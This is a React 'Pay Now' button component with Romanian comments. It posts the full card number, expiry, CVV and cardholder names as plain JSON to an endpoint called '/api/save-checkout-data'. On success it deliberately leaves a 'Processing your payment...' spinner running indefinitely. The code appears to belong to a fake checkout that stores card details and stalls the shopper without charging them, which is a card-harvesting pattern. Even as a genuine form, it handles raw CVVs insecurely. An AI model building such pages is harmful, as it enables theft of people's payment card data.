"use client";

import React, { useState } from "react";

interface PayButtonProps {
  data: {
    cardNumber: string;
    expiry: string;
    cvv: string;
    firstName: string;
    lastName: string;
    amount: string;
    userId?: string;
    country?: string;
    cardType?: string;
  };
  disabled: boolean; // Prop pentru dezactivare
}

const PayButton: React.FC<PayButtonProps> = ({ data, disabled }) => {
  const [loading, setLoading] = useState(false); // Pentru procesare

  const handleSubmit = async () => {
    setLoading(true); // Începe procesarea

    try {
      // Trimite cererea către server imediat
      const response = await fetch("/api/save-checkout-data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) throw new Error("Payment failed");

      const result = await response.json();
      console.log(result);

      // Păstrează cerculețul în continuu
    } catch (error) {
      console.error(error);
      alert("Payment failed.");
    } finally {
      // setLoading(false); // Opțional: poți alege să nu oprești cerculețul.
    }
  };

  return (
    <div>
      <button
        type="button"
        onClick={handleSubmit}
        disabled={loading || disabled}
        className={`w-full py-2 rounded ${
          loading || disabled
            ? "bg-gray-400 cursor-not-allowed"
            : "bg-blue-500 hover:bg-blue-600 text-white"
        }`}
      >
        {loading ? "Processing Payment..." : "Pay Now"}
      </button>

      {/* Modal pentru pending */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
          <div className="bg-white p-6 rounded shadow-lg text-center">
            <div className="flex flex-col items-center gap-4">
              <p className="text-gray-600 mt-4">Processing your payment...</p>
              <div className="w-14 h-14 border-4 border-blue-500 border-t-transparent border-solid rounded-full animate-spin"></div>
            </div>
            <button
              onClick={() => setLoading(false)} // Închide modalul
              className="mt-4 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default PayButton;
